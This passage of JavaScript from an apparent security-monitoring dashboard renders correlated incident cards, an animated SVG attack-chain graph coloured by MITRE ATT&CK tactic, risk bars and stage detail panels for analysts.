    const statsBar = document.getElementById('rk-inc-statsbar');
    if (statsBar && incidents.length) {
      const critInc    = incidents.filter(i => i.severity === 'critical').length;
      const highInc    = incidents.filter(i => i.severity === 'high').length;
      const crossHost  = incidents.filter(i => i.crossHost).length;
      const confirmed  = incidents.filter(i => i.confidence?.level === 'Confirmed').length;
      const totalAlerts= incidents.reduce((s, i) => s + i.detectionCount, 0);
      statsBar.innerHTML = [
        { label: 'Critical',     val: critInc,    color: '#ef4444', icon: '🔴' },
        { label: 'High',         val: highInc,    color: '#f97316', icon: '🟠' },
        { label: 'Cross-Host',   val: crossHost,  color: '#a78bfa', icon: '🔀' },
        { label: 'Confirmed',    val: confirmed,  color: '#34d399', icon: '✓'  },
        { label: 'Total Alerts', val: totalAlerts,color: '#60a5fa', icon: '⚡' },
      ].map((s, idx) => `
<div style="padding:10px 16px;background:rgba(8,14,24,0.9);
     border:1px solid ${s.color}22;border-radius:10px;text-align:center;min-width:86px;
     position:relative;overflow:hidden;cursor:default;
     animation:rk-card-appear 0.3s ease-out ${(idx*0.06).toFixed(2)}s both;
     transition:border-color 0.3s,box-shadow 0.3s;"
  onmouseenter="this.style.borderColor='${s.color}55';this.style.boxShadow='0 0 16px ${s.color}18';"
  onmouseleave="this.style.borderColor='${s.color}22';this.style.boxShadow='none';">
  <div style="position:absolute;inset:0;pointer-events:none;
    background:radial-gradient(ellipse at 50% 110%,${s.color}0a,transparent 70%);"></div>
  <div style="font-size:10px;margin-bottom:4px;opacity:0.7;">${s.icon}</div>
  <div style="font-size:20px;font-weight:900;color:${s.color};line-height:1;
    filter:drop-shadow(0 0 6px ${s.color}66);">${s.val}</div>
  <div style="font-size:9px;color:#4b5563;margin-top:3px;text-transform:uppercase;letter-spacing:.5px;">${s.label}</div>
</div>`).join('');
    }

    if (!incidents.length) {
      el.innerHTML = `
<div style="padding:60px;text-align:center;color:#4b5563;font-size:13px;">
  <div style="font-size:28px;margin-bottom:10px;">⚔️</div>
  <div style="font-size:14px;color:#6b7280;margin-bottom:6px;">No adversary-centric incidents yet.</div>
  <span style="font-size:11px;">ACE v6 correlates alerts across hosts using attacker identity (user/IP/session/process lineage).</span><br/>
  <span style="font-size:11px;color:#374151;">Run a demo or ingest logs to see the adversary attack graph view.</span>
</div>`;
      return;
    }

    el.innerHTML = incidents.map((inc, i) => _renderIncidentCard(inc, i)).join('');

    el.querySelectorAll('[data-inc-toggle]').forEach(btn => {
      btn.addEventListener('click', () => {
        const id   = btn.dataset.incToggle;
        const body = document.getElementById(`rk-inc-body-${id}`);
        if (!body) return;
        const open = body.style.display !== 'none';
        body.style.display = open ? 'none' : 'block';
        btn.innerHTML = open
          ? `<span style="color:#60a5fa;">▶</span> Evidence &amp; Child Nodes (${btn.dataset.childCount || ''})`
          : `<span style="color:#60a5fa;">▼</span> Hide Evidence`;
      });
    });

    el.querySelectorAll('[data-phase-toggle]').forEach(btn => {
      btn.addEventListener('click', () => {
        const id   = btn.dataset.phaseToggle;
        const body = document.getElementById(`rk-phase-${id}`);
        if (!body) return;
        const open = body.style.display !== 'none';
        body.style.display = open ? 'none' : 'block';
        btn.textContent = open ? `▶ Attack Phase Timeline (${(body.querySelectorAll('[style*="border-bottom"]')||[]).length} stages)` : '▼ Hide Phase Timeline';
      });
    });

    // ── BCE v10: Chain-flow collapse toggle ─────────────────────
    el.querySelectorAll('[data-chain-toggle]').forEach(btn => {
      btn.addEventListener('click', () => {
        const id   = btn.dataset.chainToggle;
        const flow = document.getElementById(`rk-chain-flow-${id}`);
        const det  = document.getElementById(`rk-stage-details-${id}`);
        if (!flow) return;
        const open = flow.style.display !== 'none';
        flow.style.display = open ? 'none' : 'block';
        if (det) det.style.display = open ? 'none' : 'block';
        btn.textContent = open ? '▶ expand' : '▼ collapse';
      });
    });
  }

  function _confidenceStyle(level) {
    switch(level) {
      case 'Confirmed':           return { color: '#ef4444', bg: 'rgba(239,68,68,0.12)',   icon: '🔴' };
      case 'Strongly Indicative': return { color: '#f97316', bg: 'rgba(249,115,22,0.12)',  icon: '🟠' };
      case 'Likely':              return { color: '#eab308', bg: 'rgba(234,179,8,0.12)',   icon: '🟡' };
      default:                    return { color: '#6b7280', bg: 'rgba(107,114,128,0.12)', icon: '⚪' };
    }
  }

  // ════════════════════════════════════════════════════════════════
  //  BCE v10 — INTERACTIVE ATTACK-CHAIN FLOW RENDERER
  //  Renders each incident as an interactive visual attack chain with:
  //    • SVG-based node graph (stages as colored boxes with arrows)
  //    • Risk evolution bar (showing risk escalation across stages)
  //    • Color-coded severity per stage node
  //    • Inferred stages shown with dashed border + italic label
  //    • One-click actions: Investigate, Isolate, Pivot to logs, Enrich IOC
  //    • Root-cause / intent summary banner
  //    • Collapsible evidence panels per stage
  // ════════════════════════════════════════════════════════════════

  // ── Tactic color map for chain nodes ──────────────────────────
  const TACTIC_NODE_COLOR = {
    'initial-access'      : '#7c3aed',  // purple
    'execution'           : '#2563eb',  // blue
    'persistence'         : '#0891b2',  // cyan
    'privilege-escalation': '#0d9488',  // teal
    'defense-evasion'     : '#059669',  // green
    'credential-access'   : '#d97706',  // amber
    'discovery'           : '#6366f1',  // indigo
    'lateral-movement'    : '#dc2626',  // red
    'collection'          : '#be185d',  // pink
    'command-and-control' : '#9333ea',  // violet
    'exfiltration'        : '#c2410c',  // orange-red
    'impact'              : '#7f1d1d',  // dark red
    'authentication'      : '#1d4ed8',  // blue
    'unknown'             : '#374151',  // gray
  };

  // ── Build an SVG-based visual attack chain flow ────────────────
  function _buildChainFlowSVG(stages, incId) {
    if (!stages || !stages.length) return '';

    const NODE_W    = 136;
    const NODE_H    = 68;
    const H_GAP     = 36;     // horizontal gap between nodes
    const MAX_ROW   = 4;      // max nodes per row before wrapping
    const ROW_GAP   = 110;    // vertical gap between rows

    const rows   = [];
    for (let i = 0; i < stages.length; i += MAX_ROW) rows.push(stages.slice(i, i + MAX_ROW));
    const svgW   = Math.min(stages.length, MAX_ROW) * (NODE_W + H_GAP) + H_GAP;
    const svgH   = rows.length * (NODE_H + ROW_GAP) + 20;

    let svgContent = '';

    // ── Defs: markers + filters + gradients ──────────────────────
    svgContent += `<defs>
      <!-- Arrow markers -->
      <marker id="arr-${incId}" markerWidth="10" markerHeight="10" refX="7" refY="3.5" orient="auto">
        <path d="M0,0 L0,7 L10,3.5 z" fill="#3d6080"/>
      </marker>
      <marker id="arr-inferred-${incId}" markerWidth="10" markerHeight="10" refX="7" refY="3.5" orient="auto">
        <path d="M0,0 L0,7 L10,3.5 z" fill="#2d4a5a"/>
      </marker>
      <marker id="arr-violation-${incId}" markerWidth="10" markerHeight="10" refX="7" refY="3.5" orient="auto">
        <path d="M0,0 L0,7 L10,3.5 z" fill="#ef4444"/>
      </marker>
      <!-- Glow filter for active nodes -->
      <filter id="glow-${incId}" x="-30%" y="-30%" width="160%" height="160%">
        <feGaussianBlur stdDeviation="3" result="blur"/>
        <feComposite in="SourceGraphic" in2="blur" operator="over"/>
      </filter>
      <!-- Soft inner glow for node fill -->
      <filter id="node-glow-${incId}" x="-20%" y="-20%" width="140%" height="140%">
        <feGaussianBlur stdDeviation="2" result="blur"/>
        <feBlend in="SourceGraphic" in2="blur" mode="screen"/>
      </filter>
      <!-- Animated gradient for the flowing edge lines -->
      <linearGradient id="edge-grad-${incId}" x1="0%" y1="0%" x2="100%" y2="0%">
        <stop offset="0%"   stop-color="#1a3040" stop-opacity="0.2"/>
        <stop offset="40%"  stop-color="#00d4ff" stop-opacity="0.8"/>
        <stop offset="100%" stop-color="#1a3040" stop-opacity="0.2"/>
        <animateTransform attributeName="gradientTransform" type="translate"
          values="-1 0; 1 0; -1 0" dur="2s" repeatCount="indefinite"/>
      </linearGradient>
      <!-- Violation gradient -->
      <linearGradient id="violation-grad-${incId}" x1="0%" y1="0%" x2="100%" y2="0%">
        <stop offset="0%"   stop-color="#7f1d1d" stop-opacity="0.3"/>
        <stop offset="50%"  stop-color="#ef4444" stop-opacity="0.9"/>
        <stop offset="100%" stop-color="#7f1d1d" stop-opacity="0.3"/>
        <animateTransform attributeName="gradientTransform" type="translate"
          values="-1 0; 1 0; -1 0" dur="1.5s" repeatCount="indefinite"/>
      </linearGradient>
      <!-- CSS animations embedded in SVG -->
      <style>
        .rk-svgnode-${incId} {
          animation: rk-svgnode-in 0.45s cubic-bezier(0.34,1.56,0.64,1) both;
          transform-box: fill-box;
          transform-origin: center;
        }
        @keyframes rk-svgnode-in {
          from { opacity:0; transform: scale(0.6); }
          to   { opacity:1; transform: scale(1);   }
        }
        .rk-svgnode-${incId}:hover .node-rect { filter: brightness(1.3); }
        .edge-flow-${incId} {
          stroke-dasharray: 8 5;
          animation: rk-dash-${incId} 1.2s linear infinite;
        }
        @keyframes rk-dash-${incId} {
          to { stroke-dashoffset: -26; }
        }
        .edge-violation-${incId} {
          stroke-dasharray: 6 4;
          animation: rk-violation-${incId} 0.7s linear infinite;
        }
        @keyframes rk-violation-${incId} {
          to { stroke-dashoffset: -20; }
        }
        .pulse-ring-${incId} {
          animation: rk-pulse-ring-${incId} 2s ease-out infinite;
          transform-box: fill-box;
          transform-origin: center;
        }
        @keyframes rk-pulse-ring-${incId} {
          0%   { opacity: 0.7; transform: scale(0.85); }
          100% { opacity: 0;   transform: scale(1.5);  }
        }
      </style>
    </defs>`;

    // Background grid dots for the SVG canvas
    svgContent += `<rect width="${svgW}" height="${svgH}" fill="rgba(2,6,10,0.0)" rx="8"/>`;
    for (let gx = 20; gx < svgW; gx += 24) {
      for (let gy = 8; gy < svgH; gy += 24) {
        svgContent += `<circle cx="${gx}" cy="${gy}" r="0.8" fill="rgba(0,212,255,0.06)"/>`;
      }
    }

    rows.forEach((rowStages, rowIdx) => {
      const rowY = rowIdx * (NODE_H + ROW_GAP) + 10;

      rowStages.forEach((stage, colIdx) => {
        const globalIdx  = rowIdx * MAX_ROW + colIdx;
        const delay      = (globalIdx * 0.07).toFixed(2);
        const x          = colIdx * (NODE_W + H_GAP) + 10;
        const y          = rowY;
        const cx         = x + NODE_W / 2;
        const cy         = y + NODE_H / 2;

        const tactic     = (stage.tactic || stage.tacticRole || 'unknown').toLowerCase().replace(/\s+/g,'-');
        const nodeColor  = TACTIC_NODE_COLOR[tactic] || TACTIC_NODE_COLOR['unknown'];
        const sevColor   = _sev(stage.severity || 'medium').color;
        const isInferred = stage.inferred;
        const conf       = stage.confidence || 0;
        const confW      = Math.round((NODE_W - 16) * conf / 100);

        const borderStyle = isInferred ? `stroke-dasharray="6,3"` : '';
        const nodeOpacity = isInferred ? '0.72' : '1';
        const label       = (stage.ruleName || stage.technique || `Stage ${globalIdx + 1}`);
        const shortLabel  = label.length > 17 ? label.slice(0, 15) + '…' : label;
        const techLabel   = stage.technique || '';

        // ── Node group (animated entrance with stagger delay) ──
        svgContent += `
        <g class="rk-chain-node rk-svgnode-${incId}" data-stage="${globalIdx}" data-inc="${incId}"
           onclick="RAYKAN_UI._toggleStageDetail('${incId}', ${globalIdx})"
           style="cursor:pointer;animation-delay:${delay}s;" opacity="${nodeOpacity}">

          <!-- Outer pulse ring (critical/high nodes only) -->
          ${(!isInferred && (stage.severity === 'critical' || stage.severity === 'high')) ? `
          <rect class="pulse-ring-${incId}" x="${x-5}" y="${y-5}"
            width="${NODE_W+10}" height="${NODE_H+10}" rx="12"
            fill="none" stroke="${sevColor}" stroke-width="1.5" opacity="0.5"/>` : ''}

          <!-- Node body shadow -->
          <rect x="${x+3}" y="${y+4}" width="${NODE_W}" height="${NODE_H}" rx="10"
            fill="rgba(0,0,0,0.5)"/>

          <!-- Node background fill -->
          <rect class="node-rect" x="${x}" y="${y}" width="${NODE_W}" height="${NODE_H}" rx="10"
            fill="${nodeColor}1a" stroke="${nodeColor}" stroke-width="${isInferred ? '1.2' : '1.8'}"
            ${borderStyle}/>

          <!-- Inner gradient highlight -->
          <rect x="${x+1}" y="${y+1}" width="${NODE_W-2}" height="${Math.round(NODE_H*0.45)}" rx="9"
            fill="rgba(255,255,255,0.04)"/>

          <!-- Severity accent bar (top) -->
          <rect x="${x+2}" y="${y}" width="${NODE_W-4}" height="3" rx="2"
            fill="${sevColor}" opacity="0.9"/>
          <!-- Severity bar glow -->
          <rect x="${x+2}" y="${y}" width="${NODE_W-4}" height="3" rx="2"
            fill="${sevColor}" opacity="0.4" filter="url(#glow-${incId})"/>

          <!-- Stage number badge -->
          <circle cx="${x+15}" cy="${y+18}" r="10" fill="${nodeColor}" opacity="0.95"/>
          <circle cx="${x+15}" cy="${y+18}" r="10" fill="rgba(255,255,255,0.08)"/>
          <text x="${x+15}" y="${y+22}" text-anchor="middle" font-size="10"
            fill="white" font-weight="800" font-family="monospace">${globalIdx + 1}</text>

          <!-- Inferred indicator -->
          ${isInferred ? `
          <rect x="${x+NODE_W-42}" y="${y+6}" width="38" height="12" rx="4"
            fill="rgba(107,114,128,0.25)" stroke="rgba(107,114,128,0.3)" stroke-width="0.8"/>
          <text x="${x+NODE_W-23}" y="${y+15}" text-anchor="middle" font-size="7.5"
            fill="#9ca3af" font-style="italic">inferred</text>` : ''}

          <!-- Main label -->
          <text x="${cx}" y="${y+34}" text-anchor="middle" font-size="10.5"
            fill="#e2e8f0" font-weight="700" font-family="'Inter',sans-serif">${shortLabel}</text>

          <!-- Technique sub-label (monospace, tactic-colored) -->
          ${techLabel ? `
          <text x="${cx}" y="${y+48}" text-anchor="middle" font-size="8.5"
            fill="${nodeColor}" font-family="'JetBrains Mono',monospace" font-weight="600"
            opacity="0.9">${techLabel}</text>` : ''}

          <!-- Confidence bar (bottom) -->
          <rect x="${x+8}" y="${y+NODE_H-9}" width="${NODE_W-16}" height="3" rx="1.5"
            fill="rgba(255,255,255,0.06)"/>
          ${confW > 0 ? `
          <rect x="${x+8}" y="${y+NODE_H-9}" width="${confW}" height="3" rx="1.5"
            fill="${nodeColor}" opacity="0.75"/>` : ''}
          <text x="${x+NODE_W-6}" y="${y+NODE_H-4}" text-anchor="end" font-size="7.5"
            fill="${nodeColor}" opacity="0.7" font-family="monospace">${conf}%</text>

        </g>`;

        // ── Animated edge to next node in same row ──
        if (colIdx < rowStages.length - 1) {
          const nextStage   = stages[globalIdx + 1];
          const isViolation = stage.hasCausalViolation || nextStage?.hasCausalViolation;
          const isInfArrow  = isInferred || nextStage?.inferred;
          const edgeDelay   = (globalIdx * 0.07 + 0.3).toFixed(2);
          const midY        = y + NODE_H / 2;
          const fromX       = x + NODE_W + 2;
          const toX         = x + NODE_W + H_GAP - 4;
          const markerId    = isViolation
            ? `arr-violation-${incId}`
            : (isInfArrow ? `arr-inferred-${incId}` : `arr-${incId}`);

          if (isViolation) {
            // Red violation edge with fast march
            svgContent += `
            <line class="edge-violation-${incId}"
              x1="${fromX}" y1="${midY}" x2="${toX}" y2="${midY}"
              stroke="url(#violation-grad-${incId})" stroke-width="2"
              marker-end="url(#${markerId})"
              style="animation-delay:${edgeDelay}s"/>
            <!-- Violation exclamation -->
            <circle cx="${fromX + (toX-fromX)/2}" cy="${midY-8}" r="6"
              fill="rgba(239,68,68,0.18)" stroke="rgba(239,68,68,0.5)" stroke-width="1"/>
            <text x="${fromX + (toX-fromX)/2}" y="${midY-4}" text-anchor="middle"
              font-size="8" fill="#ef4444" font-weight="800">!</text>`;
          } else if (isInfArrow) {
            // Dashed inferred edge
            svgContent += `
            <line x1="${fromX}" y1="${midY}" x2="${toX}" y2="${midY}"
              stroke="#2d4a5a" stroke-width="1.5" stroke-dasharray="5,4"
              marker-end="url(#${markerId})" opacity="0.7"/>`;
          } else {
            // Flowing animated edge
            svgContent += `
            <line class="edge-flow-${incId}"
              x1="${fromX}" y1="${midY}" x2="${toX}" y2="${midY}"
              stroke="url(#edge-grad-${incId})" stroke-width="2"
              marker-end="url(#${markerId})"
              style="animation-delay:${edgeDelay}s"/>`;
          }
        }

        // ── Vertical wrap connector (end of row → next row start) ──
        if (colIdx === rowStages.length - 1 && rowIdx < rows.length - 1) {
          const nextRowY = rowY + NODE_H + ROW_GAP;
          const bendX    = x + NODE_W / 2;
          svgContent += `
          <polyline points="${bendX},${y+NODE_H} ${bendX},${y+NODE_H+24} 18,${y+NODE_H+24} 18,${nextRowY}"
            fill="none" stroke="#1a3040" stroke-width="1.5" stroke-dasharray="5,4"
            marker-end="url(#arr-${incId})"/>`;
        }
      });
    });

    return `<div class="rk-chain-svg-wrap">
      <svg width="100%" viewBox="0 0 ${svgW} ${svgH}"
        style="max-width:100%;overflow:visible;display:block;"
        xmlns="http://www.w3.org/2000/svg">
        ${svgContent}
      </svg>
    </div>`;
  }

  // ── Build risk evolution bar chart ─────────────────────────────
  function _buildRiskEvolutionBar(stages, incId) {
    if (!stages || stages.length < 2) return '';

    const bars = stages.map((s, i) => {
      const risk    = s._riskScore || s.confidence || 30;
      const tactic  = (s.tactic || 'unknown').toLowerCase().replace(/\s+/g,'-');
      const color   = TACTIC_NODE_COLOR[tactic] || '#374151';
      const height  = Math.max(6, Math.round(risk * 0.44));
      const label   = s.technique || (s.tacticRole||'').slice(0,8);
      const rising  = i > 0 && (stages[i-1]._riskScore||0) < risk;
      const delay   = (i * 0.05).toFixed(2);
      return `<div class="rk-risk-evo-seg" style="height:${height}px;background:${color};opacity:${s.inferred?0.45:0.88};
          ${rising ? `box-shadow:0 -3px 8px ${color}88;` : ''}
          animation:rk-card-appear 0.4s ease-out ${delay}s both;"
        title="${s.ruleName||label}: risk ${risk}">
        <div style="position:absolute;top:-16px;left:50%;transform:translateX(-50%);font-size:8px;color:${color};font-weight:700;white-space:nowrap;">${risk}</div>
      </div>`;
    }).join('');

    // Connector line below bars showing trend
    const trend = stages.map((s,i) => {
      const risk = s._riskScore || s.confidence || 30;
      const pct  = (i / (stages.length - 1) * 100).toFixed(1);
      const y    = (100 - risk).toFixed(1);
      return `${pct},${y}`;
    }).join(' ');

    return `<div style="padding:10px 16px 8px;background:rgba(8,14,24,0.7);border-top:1px solid rgba(0,212,255,0.06);">
      <div style="font-size:9px;color:#2d4a5a;text-transform:uppercase;letter-spacing:.8px;margin-bottom:10px;font-weight:700;display:flex;align-items:center;gap:6px;">
        <span>Risk Evolution</span>
        <svg width="16" height="10" viewBox="0 0 16 10" fill="none" style="opacity:0.5;">
          <polyline points="0,9 8,3 16,1" stroke="#00d4ff" stroke-width="1.5" fill="none"/>
        </svg>
      </div>
      <div class="rk-risk-evo-bar-wrap" style="position:relative;">
        ${bars}
      </div>
      <div style="display:flex;justify-content:space-between;margin-top:4px;">
        <span style="font-size:7px;color:#1a3040;">Stage 1</span>
        <span style="font-size:7px;color:#1a3040;">Stage ${stages.length}</span>
      </div>
    </div>`;
  }

  // ── Build collapsible stage detail panel ─────────────────────
  function _buildStageDetail(stage, si, incId) {
    const tactic   = (stage.tactic || 'unknown').toLowerCase().replace(/\s+/g,'-');
    const nodeColor= TACTIC_NODE_COLOR[tactic] || '#374151';
    return `<div id="rk-stage-${incId}-${si}"
      style="display:none;padding:10px 14px;background:rgba(13,17,23,0.9);
             border-radius:8px;border:1px solid ${nodeColor}44;margin-bottom:6px;">
      <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:6px;">
        ${_sevBadge(stage.severity||'medium')}
        <span style="font-size:12px;color:#e6edf3;font-weight:600;">${stage.ruleName||stage.technique||`Stage ${si+1}`}</span>
        ${stage.ruleId ? `<span style="font-size:10px;font-family:monospace;color:#4b5563;">${stage.ruleId}</span>` : ''}
        ${stage.inferred ? `<span style="font-size:9px;padding:1px 6px;background:rgba(107,114,128,0.2);color:#6b7280;border-radius:4px;font-style:italic;">⚙ Inferred (${stage.inferredConfidence||stage.confidence}% confidence)</span>` : ''}
      </div>
      <div style="display:flex;gap:10px;flex-wrap:wrap;font-size:11px;color:#8b949e;margin-bottom:6px;">
        ${stage.technique ? `<span style="color:#a78bfa;font-family:monospace;font-weight:600;">${stage.technique}</span>` : ''}
        ${stage.tactic    ? `<span style="color:${nodeColor};">${stage.tactic.replace(/-/g,' ')}</span>` : ''}
        ${stage.host   ? `<span>🖥 ${stage.host}</span>` : ''}
        ${stage.user   ? `<span>👤 ${stage.user}</span>` : ''}
        ${stage.srcIp  ? `<span>🌐 ${stage.srcIp}</span>` : ''}
        ${stage.timestamp ? `<span>🕐 ${new Date(stage.timestamp).toLocaleString()}</span>` : ''}
      </div>
      ${stage.narrative ? `<div style="font-size:11px;color:#c9d1d9;line-height:1.5;margin-bottom:6px;">${stage.narrative.slice(0,200)}${stage.narrative.length>200?'…':''}</div>` : ''}
      ${stage.commandLine ? `<div style="font-size:10px;font-family:monospace;color:#60a5fa;background:#0d1117;padding:4px 8px;border-radius:4px;word-break:break-all;">${stage.commandLine.slice(0,200)}</div>` : ''}
      ${stage.hasCausalViolation ? `<div style="font-size:10px;color:#ef4444;margin-top:6px;">⚠ Causal violation detected at this stage</div>` : ''}
      <!-- One-click actions -->
      <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
        <button class="rk-entity-btn" onclick="RAYKAN_UI._invEntity('${stage.host||''}')" style="font-size:10px;">🔍 Investigate Host</button>
        <button class="rk-entity-btn" onclick="RAYKAN_UI._invEntity('${stage.user||''}')" style="font-size:10px;">👤 Investigate User</button>
        ${stage.srcIp ? `<button class="rk-entity-btn" onclick="RAYKAN_UI.lookupIOCVal('${stage.srcIp}')" style="font-size:10px;">🌐 Enrich IP</button>` : ''}
        ${stage.technique ? `<button class="rk-entity-btn" onclick="RAYKAN_UI._openMITRE('${stage.technique}')" style="font-size:10px;">🎯 MITRE ATT&CK</button>` : ''}
      </div>
    </div>`;
  }

  function _renderIncidentCard(inc, i) {
    const parent    = inc.parent || {};
    const children  = inc.children || [];
    const sev       = inc.severity || parent.aggregated_severity || parent.severity || 'medium';
    const incId     = inc.incidentId || `INC-${i}`;
    const shortId   = incId.split('-').slice(-2).join('-');
    const behavior  = inc.behavior || {};
    const conf      = inc.confidence || { score: 30, level: 'Possible', reasons: [] };
    const confStyle = _confidenceStyle(conf.level);
    const aceScore  = inc.aceScore || {};
    const dag       = inc.dag || {};
    const intent    = inc.intentSignals || {};

    const incidentTitle = inc.title || behavior.behaviorTitle || parent.detection_name || 'Correlated Attack Chain';

    const durStr  = inc.durationLabel || _formatDurationUI(inc.duration_ms || 0);
    const firstTs = inc.first_seen ? new Date(inc.first_seen).toLocaleString() : '—';
    const lastTs  = inc.last_seen  ? new Date(inc.last_seen).toLocaleString()  : '—';

    // ── ACE severity band ──────────────────────────────────────────
    const bandColor = {
      'Critical': '#ef4444', 'High': '#f97316', 'Medium': '#eab308', 'Low': '#6b7280'
    }[aceScore.severityBand || ''] || '#6b7280';

    // ── Cross-host badge ───────────────────────────────────────────
    const crossHostBadge = inc.crossHost
      ? `<span style="font-size:10px;padding:2px 8px;background:rgba(167,139,250,0.15);color:#a78bfa;border-radius:6px;font-weight:700;">🔀 Cross-Host (${(inc.allHosts||[]).length} hosts)</span>`
      : '';

    // ── MITRE tactic pills ─────────────────────────────────────────
    const tacticPills = (inc.mitreTactics || []).map(t =>
      `<span style="font-size:9px;padding:2px 8px;background:rgba(167,139,250,0.12);color:#a78bfa;border-radius:6px;font-weight:600;">${t.replace(/-/g,' ')}</span>`
    ).join('');

    // ── Full MITRE technique matrix ────────────────────────────────
    const mitreMappings = (inc.mitreMappings || (inc.techniques || []).map(t => ({ technique: t, role: 'secondary', tactic: '' })));
    const techniqueMatrix = mitreMappings.slice(0, 8).map(m =>
      `<span style="font-size:10px;padding:2px 8px;background:rgba(96,165,250,0.1);color:#60a5fa;border-radius:5px;font-family:monospace;"
        title="${m.name || ''} — ${m.tactic || ''} [${m.role || 'secondary'}] host:${m.host||''}">
        ${m.technique}${m.role==='primary'?' ★':''}
      </span>`
    ).join('');

    // ── Phase sequence (DAG) ───────────────────────────────────────
    const phaseSeq = (dag.phaseSequence || []);
    const phaseSeqHtml = phaseSeq.length > 0
      ? `<div style="display:flex;gap:4px;align-items:center;flex-wrap:wrap;margin-bottom:6px;">`
        + phaseSeq.map((ph, pi) =>
            `<span style="font-size:9px;padding:2px 7px;background:rgba(52,211,153,0.1);color:#34d399;border-radius:5px;">${ph.replace(/-/g,' ')}</span>`
            + (pi < phaseSeq.length-1 ? `<span style="color:#374151;font-size:9px;">→</span>` : '')
          ).join('')
        + `</div>`
      : '';

    // ── Adversary identity ─────────────────────────────────────────
    const hostList = (inc.allHosts || [inc.host]).filter(Boolean).slice(0,5);
    const userList = (inc.allUsers || [inc.user]).filter(Boolean).slice(0,3);
    const ipList   = (inc.allSrcIps || []).filter(Boolean).slice(0,3);
    const identityHtml = `
<div style="display:flex;gap:10px;flex-wrap:wrap;font-size:11px;">
  ${hostList.length ? `<span style="color:#8b949e;">🖥 <strong style="color:#c9d1d9;">${hostList.join(', ')}</strong></span>` : ''}
  ${userList.length ? `<span style="color:#8b949e;">👤 <strong style="color:#c9d1d9;">${userList.join(', ')}</strong></span>` : ''}
  ${ipList.length   ? `<span style="color:#8b949e;">🌐 <strong style="color:#c9d1d9;">${ipList.join(', ')}</strong></span>` : ''}
</div>`;

    // ── Intent signals ─────────────────────────────────────────────
    const intentHtml = intent.attackerCount > 0
      ? `<span style="font-size:9px;padding:1px 6px;background:rgba(239,68,68,0.1);color:#ef4444;border-radius:5px;">⚡ ${intent.attackerCount} attacker signal${intent.attackerCount>1?'s':''}</span>`
      : (intent.adminCount > 0
          ? `<span style="font-size:9px;padding:1px 6px;background:rgba(52,211,153,0.1);color:#34d399;border-radius:5px;">🔧 ${intent.adminCount} admin signal${intent.adminCount>1?'s':''}</span>`
          : '');

    // ── Correlation basis badge ────────────────────────────────────
    const basisBadge = inc.correlationBasis === 'adversary-centric-cross-host'
      ? `<span style="font-size:9px;padding:1px 6px;background:rgba(167,139,250,0.1);color:#a78bfa;border-radius:5px;">ACE:cross-host</span>`
      : `<span style="font-size:9px;padding:1px 6px;background:rgba(96,165,250,0.1);color:#60a5fa;border-radius:5px;">ACE:single-host</span>`;

    // ── Confidence reasons ─────────────────────────────────────────
    const confReasons = (conf.reasons || []).length > 0
      ? conf.reasons.map(r => `<li style="margin-bottom:2px;">${r}</li>`).join('')
      : '<li>Single-event detection</li>';

    // ── BCE v10: Build interactive attack-chain flow ───────────────
    // Pull kill-chain stages from phaseTimeline (includes inferred stages)
    const phaseTimeline   = inc.phaseTimeline || [];
    const hasInferred     = phaseTimeline.some(p => p.inferred || p.inferredFrom);
    const inferredCount   = phaseTimeline.filter(p => p.inferred || p.inferredFrom).length;
    const observedCount   = phaseTimeline.filter(p => !p.inferred && !p.inferredFrom).length;

    // Build stages array for visualization from phaseTimeline
    const vizStages = phaseTimeline.map((p, si) => ({
      ...p,
      _riskScore  : p.riskScore || 0,
      tactic      : p.phaseTactic || p.tactic || '',
      tacticRole  : p.phaseTactic || p.tactic || '',
      inferred    : !!(p.inferred || p.inferredFrom),
      confidence  : p.confidence || (p.riskScore ? Math.min(p.riskScore, 100) : 30),
    }));

    // Visual attack-chain flow SVG
    const chainFlowSVG = vizStages.length > 0 ? _buildChainFlowSVG(vizStages, incId) : '';

    // Risk evolution bar
    const riskEvolutionBar = vizStages.length >= 2 ? _buildRiskEvolutionBar(vizStages, incId) : '';

    // Stage detail panels (initially hidden, shown on node click)
    const stageDetails = vizStages.map((s, si) => _buildStageDetail(s, si, incId)).join('');

    // ── Phase timeline rows (text fallback) ───────────────────────
    const phaseRows = phaseTimeline.map((pt, pi) => {
      const ptSev  = pt.severity || 'medium';
      const ptDot  = `<span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${_sev(ptSev).color};flex-shrink:0;"></span>`;
      const ptTs   = pt.first_seen ? new Date(pt.first_seen).toLocaleTimeString() : '—';
      const ptDur  = (pt.duration_ms && pt.duration_ms > 0) ? ` (${_formatDurationUI(pt.duration_ms)})` : '';
      const ptEdge = (pt.causalEdges || []).length > 0
        ? `<span style="font-size:9px;color:#4b5563;"> → ${pt.causalEdges[0]}</span>` : '';
      const hostTransition = pt.isHostTransition
        ? `<span style="font-size:9px;padding:1px 5px;background:rgba(167,139,250,0.1);color:#a78bfa;border-radius:4px;">🔀 host pivot</span>` : '';
      const isInf = pt.inferred || pt.inferredFrom;
      return `
<div style="display:flex;align-items:flex-start;gap:10px;padding:8px 0;border-bottom:1px solid #1c2128;">
  <div style="display:flex;flex-direction:column;align-items:center;min-width:24px;padding-top:2px;">
    ${ptDot}
    ${pi < phaseTimeline.length-1 ? '<div style="width:1px;height:20px;background:#21262d;margin:2px auto;"></div>' : ''}
  </div>
  <div style="flex:1;min-width:0;">
    <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:3px;">
      <span style="font-size:10px;padding:1px 7px;background:rgba(167,139,250,0.1);color:#a78bfa;border-radius:5px;font-weight:600;">${pt.phase}</span>
      ${_sevBadge(ptSev)}
      <span style="font-size:11px;color:#e6edf3;font-weight:600;">${pt.ruleName || pt.ruleId || 'Detection'}</span>
      ${pt.technique ? `<span style="font-size:10px;font-family:monospace;color:#60a5fa;">${pt.technique}</span>` : ''}
      ${pt.isParent ? `<span style="font-size:9px;padding:1px 5px;background:rgba(239,68,68,0.1);color:#ef4444;border-radius:4px;">PARENT</span>` : ''}
      ${hostTransition}
      ${isInf ? `<span style="font-size:9px;padding:1px 5px;background:rgba(107,114,128,0.15);color:#6b7280;border-radius:4px;font-style:italic;">⚙ inferred</span>` : ''}
    </div>
    <div style="font-size:10px;color:#6b7280;">
      <span style="color:#4b5563;">${ptTs}${ptDur}</span>
      ${pt.host ? ` · 🖥 ${pt.host}` : ''}
      ${pt.user ? ` · 👤 ${pt.user}` : ''}
      ${pt.srcIp ? ` · 🌐 ${pt.srcIp}` : ''}
      ${ptEdge}
    </div>
